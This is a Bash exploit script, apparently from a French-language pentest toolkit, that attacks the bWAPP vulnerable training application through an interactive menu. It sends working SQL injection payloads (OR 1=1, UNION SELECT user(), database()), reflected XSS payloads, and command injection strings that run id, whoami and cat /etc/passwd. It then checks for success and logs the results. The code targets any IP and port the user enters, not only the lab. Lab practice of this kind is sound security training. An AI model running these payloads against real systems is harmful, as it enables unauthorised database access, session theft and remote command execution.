#!/bin/bash
# modules/labs/bwapp/exploits.sh - Exploits bWAPP (3 essentiels)

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/bwapp_exploits"
mkdir -p "$LOG_DIR"

# ==========================
# 1. SQL Injection
# ==========================

exploit_sqli() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [bWAPP - SQL Injection]${NC}"
    echo -e "${CYAN}üìñ Objectif : SQLi via param√®tre GET${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : Data leakage${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Prepared statements${NC}"
    echo
    
    check_tools curl || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8084): " PORT; PORT=${PORT:-8084}
    BASE="http://${IP}:${PORT}"
    
    local payloads=(
        "1' OR '1'='1"
        "1' UNION SELECT NULL, user(), database()--"
        "1' AND 1=1--"
    )
    
    echo -e "\n${YELLOW}‚ñ∂ Test SQLi...${NC}\n"
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/sqli_1.php?title=${enc}&action=search"
        
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local resp=$(curl -s --max-time 10 \
            -b "PHPSESSID=test; security_level=0" \
            "$url" 2>/dev/null)
        
        if validate_response "$resp" "mysql" "database" "root@" "user()"; then
            echo -e "${GREEN}‚úÖ SQLi SUCCESS${NC}"
            log_exploit "${LOG_DIR}/sqli.log" "SUCCESS" "SQLi: $payload"
            
            echo "$resp" | grep -iE "mysql|database|root" | head -n 5
            break
        else
            echo -e "${YELLOW}‚ö†Ô∏è Pas de r√©sultat SQLi √©vident${NC}"
        fi
        
        echo
    done
    
    read -p "üëâ Entr√©e..."
}

# ==========================
# 2. XSS
# ==========================

exploit_xss() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [bWAPP - XSS]${NC}"
    echo -e "${CYAN}üìñ Objectif : XSS reflected${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : Session hijacking${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Output encoding${NC}"
    echo
    
    check_tools curl || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8084): " PORT; PORT=${PORT:-8084}
    BASE="http://${IP}:${PORT}"
    
    local payloads=(
        "$(generate_xss_payload basic)"
        "$(generate_xss_payload img)"
    )
    
    echo -e "\n${YELLOW}‚ñ∂ Test XSS...${NC}\n"
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/xss_get.php?firstname=${enc}&lastname=test&form=submit"
        
        echo -e "${CYAN}Payload: ${payload:0:40}${NC}"
        
        local resp=$(curl -s --max-time 10 \
            -b "PHPSESSID=test; security_level=0" \
            "$url" 2>/dev/null)
        
        if echo "$resp" | grep -qF "$payload"; then
            echo -e "${GREEN}‚úÖ XSS reflected${NC}"
            log_exploit "${LOG_DIR}/xss.log" "SUCCESS" "XSS: ${payload:0:30}"
        else
            echo -e "${YELLOW}‚ö†Ô∏è XSS bloqu√© ou encod√©${NC}"
        fi
        
        echo
    done
    
    read -p "üëâ Entr√©e..."
}

# ==========================
# 3. Command Injection
# ==========================

exploit_cmdinj() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [bWAPP - Command Injection]${NC}"
    echo -e "${CYAN}üìñ Objectif : Ex√©cution commandes OS${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : RCE${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Input validation${NC}"
    echo
    
    check_tools curl || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8084): " PORT; PORT=${PORT:-8084}
    BASE="http://${IP}:${PORT}"
    
    local payloads=(
        "127.0.0.1; id"
        "127.0.0.1 && whoami"
        "127.0.0.1 | cat /etc/passwd"
    )
    
    echo -e "\n${YELLOW}‚ñ∂ Test Command Injection...${NC}\n"
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/commandi.php?target=${enc}&form=submit"
        
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local resp=$(curl -s --max-time 10 \
            -b "PHPSESSID=test; security_level=0" \
            "$url" 2>/dev/null)
        
        if validate_response "$resp" "uid=" "root:" "www-data"; then
            echo -e "${GREEN}‚úÖ Command Injection SUCCESS${NC}"
            log_exploit "${LOG_DIR}/cmdinj.log" "SUCCESS" "CmdInj: $payload"
            
            echo "$resp" | grep -E "uid=|root:" | head -n 5
            break
        else
            echo -e "${YELLOW}‚ö†Ô∏è Pas d'ex√©cution d√©tect√©e${NC}"
        fi
        
        echo
    done
    
    read -p "üëâ Entr√©e..."
}

# ==========================
# Menu
# ==========================

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}=== üí£ Exploits bWAPP ===${NC}"
        echo
        echo -e "${GREEN}1) SQL Injection${NC}"
        echo -e "${GREEN}2) XSS (Cross-Site Scripting)${NC}"
        echo -e "${GREEN}3) Command Injection${NC}"
        echo
        echo -e "${RED}0) Retour${NC}"
        echo
        read -p "üëâ Choix : " choice

        case $choice in
            1) exploit_sqli ;;
            2) exploit_xss ;;
            3) exploit_cmdinj ;;
            0) return ;;
            *)
                echo -e "${RED}‚ùå Invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
